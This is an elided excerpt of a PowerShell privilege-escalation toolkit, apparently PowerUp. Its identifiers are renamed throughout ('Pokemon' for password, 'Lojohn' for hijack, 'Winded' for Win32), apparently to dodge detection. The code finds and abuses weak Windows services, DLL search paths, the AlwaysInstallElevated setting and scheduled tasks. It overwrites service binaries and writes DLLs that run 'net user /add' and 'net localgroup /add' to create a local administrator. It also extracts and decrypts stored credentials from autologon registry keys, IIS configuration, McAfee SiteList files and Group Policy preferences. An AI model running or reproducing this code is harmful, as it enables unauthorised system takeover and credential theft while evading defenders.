...
function Get-CurrentUserTokenGroupSid {
    ...
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()
    ...
    if($Success) {
        ...
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()
        ...
        if($Success) {
            ...
            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                ...
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()
                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.WindedException] $LastError).Message)"
                }
                else {
            ...
            Write-Warning ([ComponentModel.WindedException] $LastError)
        }
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                ...
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()


                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinzSecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinzSecurityDescriptor, $BinzSecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.WindedException] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinzSecurityDescriptor, 0
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                ...
                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWindedError()
...
function Get-ServiceUnquoted {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModzFiles = $Service.pathname.split(' ') | Get-ModzPath

            $ModzFiles | Where-Object {$_ -and $_.ModzPath -and ($_.ModzPath -ne '')} | Foreach-Object {
                ...
                $Out | Add-Member Noteproperty 'ModzPath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinz -Name '$($Service.name)' -Path <LojohnPath>"
...
function Get-ModzServiceFile {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | Get-ModzPath | ForEach-Object {
            ...
            $Out | Add-Member Noteproperty 'ModzFile' $_.ModzPath
            $Out | Add-Member Noteproperty 'ModzFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModzFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinz -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($PSBoundParameters['Credential']) {
                ...
                $PokemonToAdd = $Credential.GetNetworkCredential().Pokemon
            }
            else {
            ...
            if($UserNameToAdd.Contains('\')) {
                ...
                $ServiceCommands = @("net user $UserNameToAdd $PokemonToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }
...
function Write-ServiceBinz {
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($UserNameToAdd.Contains('\')) {
                ...
                $ServiceCommand = "net user $UserNameToAdd $PokemonToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }
    ...
    PROCESS {
        ...
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            ...
            $Binz[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {

            $Binz[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $Binz -Encoding Byte -Path $Path -Force -ErrorAction Stop
...
function Install-ServiceBinz {
    ...
    PROCESS {
        ...
        $ModzFiles = $ServiceDetails.PathName | Get-ModzPath -LiteralPaths

        if(-not $ModzFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModzFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModzPath
        ...
        $Result = Write-ServiceBinz -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function Find-PathDLLLojohn {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        ...
        $ModifidablePaths = $TargetPath | Get-ModzPath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModzPath -ne $Null) -and ($_.ModzPath.Trim() -ne '')}
        ForEach($ModifidablePath in $ModifidablePaths) {
            if($ModifidablePath.ModzPath -ne $Null) {
...
function Write-LojohnDll {
    ...
    if($PSBoundParameters['Command']) {
        ...
        if($UserNameToAdd.Contains('\')) {
            ...
            $BatCommand = "net user $UserNameToAdd $PokemonToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }
...
function Get-ReggiAlwaysInstallEled {
    ...
    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {
        ...
        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallEled -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallEled)"

        if ($HKLMval.AlwaysInstallEled -and ($HKLMval.AlwaysInstallEled -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallEled -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallEled)"

            if ($HKCUval.AlwaysInstallEled -and ($HKCUval.AlwaysInstallEled -ne 0)){
                Write-Verbose "AlwaysInstallEled enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallEled not enabled on this machine."
                $False
            }
        }
        else{
...
function Get-ReggiAutoLogon {
    ...
    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
        ...
        $DefaultPokemon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPokemon -ErrorAction SilentlyContinue).DefaultPokemon
        ...
        $AltDefaultPokemon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPokemon -ErrorAction SilentlyContinue).AltDefaultPokemon
        ...
        if ($DefaultUserName -or $AltDefaultUserName) {
            ...
            $Out | Add-Member Noteproperty 'DefaultPokemon' $DefaultPokemon
            ...
            $Out | Add-Member Noteproperty 'AltDefaultPokemon' $AltDefaultPokemon
            $Out
        }
    }
}

function Get-ModzReggiAutoRun {
    ...
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        ...
        ForEach ($Name in $Keys.GetValueNames()) {
            ...
            $Path | Get-ModzPath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModzFile' $_
                $Out
            }
        }
    }
...
function Get-ModzScheduledTaskFile {
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | Get-ModzPath | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModzPath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function Get-ApplicationHost {
    ...
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        ...
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
            ...
            $PoolPokemonCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.pokemon"
            $PoolPokemon = Invoke-Expression $PoolPokemonCmd


            if (($PoolPokemon -ne "") -and ($PoolPokemon -isnot [system.array])) {

                $Null = $DataTable.Rows.Add($PoolUser, $PoolPokemon,'Application Pool','NA',$PoolName)
            }
        }
        ...
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
            ...
            $VdirPokemonCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:pokemon"
            $VdirPokemon = Invoke-Expression $VdirPokemonCmd


            if (($VdirPokemon -ne "") -and ($VdirPokemon -isnot [system.array])) {

                $Null = $DataTable.Rows.Add($VdirUser, $VdirPokemon,'Virtual Directory',$VdirName,'NA')
            }
        }
        ...
        if( $DataTable.rows.Count -gt 0 ) {
            ...
            Write-Verbose 'No application pool or virtual directory pokemons were found.'
            $False
        }
    }
    else {
...
function Get-SiteListPokemon {
    ...
    BEGIN {
        function Local:Get-DecryptedSitelistPokemon {
        ...
        function Local:Get-SitelistFields {
            ...
            try {
                ...
                if($SiteListXml.InnerXml -Like "*pokemon*") {
                    Write-Verbose "Potential pokemon in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PokemonRaw = $_.Pokemon.'#Text'

                            if($_.Pokemon.Encrypted -eq 1) {

                                $DecPokemon = if($PokemonRaw) { (Get-DecryptedSitelistPokemon -B64Pass $PokemonRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPokemon = $PokemonRaw
                            }
                            ...
                            $ObjectProperties = @{
                                ...
                                'UserName' = $_.UserName;
                                'EncPokemon' = $PokemonRaw;
                                'DecPokemon' = $DecPokemon;
                            }
...
function Get-CachedGPPPokemon {
    ...
    function local:Get-DecryptedCpokemon {
        [CmdletBinding()]
        Param (
            [string] $Cpokemon 
        )
        ...
        try {
            ...
            $Mod = ($Cpokemon.length % 4)
            
            switch ($Mod) {
                '1' {$Cpokemon = $Cpokemon.Substring(0,$Cpokemon.Length -1)}
                '2' {$Cpokemon += ('=' * (4 - $Mod))}
                '3' {$Cpokemon += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpokemon)
    ...
    function local:Get-GPPInnerFields {
        ...
        try {
            ...
            if ($Xml.innerxml -like "*cpokemon*"){
            
                Write-Verbose "Potential pokemon in $File"
                
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpokemon += , $Xml | Select-Xml "/Groups/User/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    ...
                    'Services.xml' {  
                        $Cpokemon += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpokemon += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpokemon += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpokemon += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpokemon += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpokemon" | Select-Object -Expand Node | ForEach-Object {$_.Value}
           ...
           foreach ($Pass in $Cpokemon) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPokemon = Get-DecryptedCpokemon $Pass
               Write-Verbose "Decrypted a pokemon of $DecryptedPokemon"

               $Pokemon += , $DecryptedPokemon
           }
            

            if (-not $Pokemon) {$Pokemon = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  

            $ObjectProperties = @{'Pokemons' = $Pokemon;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            ...
            Write-Verbose "The pokemon is between {} and may be more than one value."
    ...
    try {
        ...
        if ( -not $XMlFiles ) {
            ...
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain pokemons."
...
function Invoke-chizzy {
    ...
    $Results = Get-ModzService
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Modz Services</H2>" | Out-File -Append $HtmlReportFile
    }
    ...
    $Results | Where-Object {$_} | Foreach-Object {
        $AbuseString = "Write-LojohnDll -DllPath '$($_.ModzPath)\wlbsctrl.dll'"
    ...
    "`n`n[*] Checking for AlwaysInstallEled registry key..."
    if (Get-ReggiAlwaysInstallEled) {
        $Out = New-Object PSObject
        ...
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallEled</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-ReggiAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Reggi Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for modifidable registry autoruns and configs..."
    $Results = Get-ModzReggiAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Reggi Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }



    "`n`n[*] Checking for modifiable schtask files/configs..."
    $Results = Get-ModzScheduledTaskFile
    $Results | Format-List
    if($HTMLReport) {
    ...
    "`n`n[*] Checking for encrypted application pool and virtual directory pokemons..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Pokemons</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for plaintext pokemons in McAfee SiteList.xml files...."
    $Results = Get-SiteListPokemon | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
    ...
    $Results = Get-CachedGPPPokemon | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
...
$Types = $FunctionDefinitions | Add-WindedType -Module $Module -Namespace 'PowerUp.NativeMethods'
